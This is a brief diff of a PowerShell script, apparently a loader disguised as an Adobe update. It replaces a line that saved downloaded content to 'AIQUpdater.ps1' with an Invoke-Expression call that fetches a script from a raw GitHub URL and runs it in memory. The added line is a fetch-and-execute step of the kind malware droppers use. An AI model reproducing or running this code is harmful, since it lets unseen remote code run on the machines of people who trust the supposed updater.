@@ -39,6 +39,6 @@ $dricksjisx='https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/AIQU
 
 Start-Sleep -s 3
 
-Add-Content -Path ".\AIQUpdater.ps1" (new-object net.webclient).downloadstring($dricksjisx)
+IEX ((new-object net.webclient).downloadstring($dricksjisx))
 
 }
